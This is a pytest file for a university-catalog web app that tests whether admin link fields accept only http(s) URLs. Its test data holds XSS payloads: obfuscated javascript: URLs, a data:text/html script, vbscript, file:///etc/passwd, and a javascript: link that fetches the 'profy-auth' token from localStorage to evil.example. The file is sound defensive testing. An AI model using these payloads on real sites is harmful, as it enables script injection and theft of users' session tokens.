"""Links stored on a university or a program are web links (SEC-10).

`University.website` is the href of «Сайт вуза» on the public pages; a
`javascript:` value there runs as script for every student who clicks it.
"""

import json
import uuid
from pathlib import Path

import httpx
import pytest
from pydantic import ValidationError
from sqlalchemy.ext.asyncio import AsyncSession

from app.i18n.catalog import api_errors
from app.models.program import Program
from app.models.university import University
from app.schemas.admin_university import AdminProgramUpdateRequest, AdminUniversityUpdateRequest
from app.schemas.validation import http_url

NOT_WEB_LINKS = [
    "javascript:alert(document.domain)",
    "JaVaScRiPt:alert(1)",
    "java\tscript:alert(1)",
    " javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "vbscript:msgbox(1)",
    "file:///etc/passwd",
    "kaznu.kz",
    "//kaznu.kz",
    "https://",
    "https:kaznu.kz",
    "http://[broken",
]


@pytest.mark.parametrize("value", NOT_WEB_LINKS)
def test_anything_but_an_http_link_is_rejected(value: str) -> None:
    with pytest.raises(Exception) as error:
        http_url(value)

    assert api_errors.RU["url_must_be_http"] in str(error.value)


@pytest.mark.parametrize(
    ("value", "stored"),
    [
        ("https://kaznu.kz", "https://kaznu.kz"),
        ("http://old-site.kz/abiturient?lang=ru#grants", "http://old-site.kz/abiturient?lang=ru#grants"),
        ("  https://kaznu.kz/  ", "https://kaznu.kz/"),
        ("HTTPS://KAZNU.KZ", "HTTPS://KAZNU.KZ"),
        ("https://қазұу.kz", "https://қазұу.kz"),
        # Clearing the field stays possible.
        ("", ""),
        (None, None),
    ],
)
def test_web_links_and_an_empty_value_are_kept(value: str | None, stored: str | None) -> None:
    assert http_url(value) == stored


@pytest.mark.parametrize(
    "request_with_a_bad_link",
    [
        lambda: AdminUniversityUpdateRequest(website="javascript:alert(1)"),
        lambda: AdminUniversityUpdateRequest(source_url="javascript:alert(1)"),
        lambda: AdminProgramUpdateRequest(source_url="javascript:alert(1)"),
    ],
)
def test_every_link_field_of_the_admin_forms_is_checked(request_with_a_bad_link) -> None:
    with pytest.raises(ValidationError, match="url_must_be_http"):
        request_with_a_bad_link()


async def _university(db: AsyncSession, **fields) -> University:
    university = University(name=f"Uni {uuid.uuid4()}", country="KZ", city="Almaty", **fields)
    db.add(university)
    await db.commit()
    await db.refresh(university)
    return university


async def test_admin_cannot_save_a_script_as_the_university_site(
    client: httpx.AsyncClient, admin_headers: dict[str, str], db_session: AsyncSession
) -> None:
    university = await _university(db_session, website="https://kaznu.kz")

    response = await client.patch(
        f"/api/v1/admin/universities/{university.id}",
        headers=admin_headers,
        json={"website": "javascript:fetch('https://evil.example/?t='+localStorage.getItem('profy-auth'))"},
    )

    assert response.status_code == 422
    error = response.json()["detail"][0]
    assert error["loc"] == ["body", "website"]
    # Catalog text in the admin's own language (`users.locale`, ru here).
    assert error["msg"] == api_errors.RU["url_must_be_http"]
    await db_session.refresh(university)
    assert university.website == "https://kaznu.kz"


async def test_admin_can_still_change_and_clear_the_site(
    client: httpx.AsyncClient, admin_headers: dict[str, str], db_session: AsyncSession
) -> None:
    university = await _university(db_session, website="https://kaznu.kz")
    url = f"/api/v1/admin/universities/{university.id}"

    changed = await client.patch(url, headers=admin_headers, json={"website": " https://www.kaznu.kz/ru "})
    assert changed.status_code == 200
    assert changed.json()["website"] == "https://www.kaznu.kz/ru"

    cleared = await client.patch(url, headers=admin_headers, json={"website": None})
    assert cleared.status_code == 200
    assert cleared.json()["website"] is None


async def test_admin_cannot_save_a_script_as_a_program_source(
    client: httpx.AsyncClient, admin_headers: dict[str, str], db_session: AsyncSession
) -> None:
    university = await _university(db_session)
    program = Program(university_id=university.id, name="Информатика", language="ru")
    db_session.add(program)
    await db_session.commit()

    response = await client.patch(
        f"/api/v1/admin/programs/{program.id}",
        headers=admin_headers,
        json={"source_url": "javascript:alert(1)"},
    )

    assert response.status_code == 422
    assert response.json()["detail"][0]["loc"] == ["body", "source_url"]


def test_the_committed_catalog_snapshot_holds_only_web_links() -> None:
    """The import (`scripts/build_universities.py`) writes these values
    straight into the table, past the admin form — so the file it loads is
    held to the same rule."""
    snapshot = json.loads(
        (Path(__file__).resolve().parents[2] / "scripts" / "data" / "university_snapshot.clean.json").read_text(
            encoding="utf-8"
        )
    )

    offenders = []
    for university in snapshot["universities"]:
        for owner in (university, *university.get("programs", [])):
            for field in ("website", "source_url"):
                value = owner.get(field)
                if not value:
                    continue
                try:
                    http_url(value)
                except Exception:
                    offenders.append((university.get("slug"), field, value))

    assert offenders == []
